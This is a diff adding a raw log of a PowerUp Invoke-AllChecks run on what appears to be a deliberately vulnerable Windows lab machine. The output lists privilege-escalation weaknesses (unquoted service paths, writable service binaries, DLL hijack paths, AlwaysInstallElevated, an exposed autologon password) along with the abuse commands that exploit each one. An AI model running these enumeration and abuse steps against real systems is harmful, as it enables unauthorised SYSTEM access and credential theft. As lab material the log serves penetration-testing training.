@@ -1,0 +1,105 @@
+
+import-module .\PowerUp.ps1
+invoke-allchecks
+
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...
+
+ServiceName    : unquosvc
+Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : unquosvc
+Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
+CanRestart     : True
+
+
+[*] Checking service executable and argument permissions...  
+
+ServiceName                     : filepermsvc
+Path                            : "C:\Program Files\File Application Service\fileservice.exe"
+ModifiableFile                  : C:\Program Files\File Application Service\fileservice.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : WIN-EVAGJ1T16QD\user
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+CanRestart                      : True
+
+
+[*] Checking service permissions... 
+
+ServiceName   : daclasvc
+Path          : "C:\Program Files\Clapplication\clservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'daclasvc'
+CanRestart    : True
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+
+[*] Checking for AlwaysInstallElevated registry key... (privesc8)
+
+AbuseFunction : Write-UserAddMSI
+
+
+[*] Checking for Autologon credentials in registry...
+
+DefaultDomainName    : 
+DefaultUserName      : user
+DefaultPassword      : password321!
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+
+
+[*] Checking for modifidable registry autoruns and configs... 
+
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+Path           : "C:\Program Files\AutoProgram\program.exe"
+ModifiableFile : @{ModifiablePath=C:\Program Files\AutoProgram\program.exe; IdentityReference=Everyone; 
+                 Permissions=System.Object[]}
+
+[*] Checking for modifiable schtask files/configs...
+
+[*] Checking for unattended install files...
+UnattendPath : C:\Windows\Panther\Unattend.xml
+
+
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[*] Checking for cached Group Policy Preferences .xml files....
+
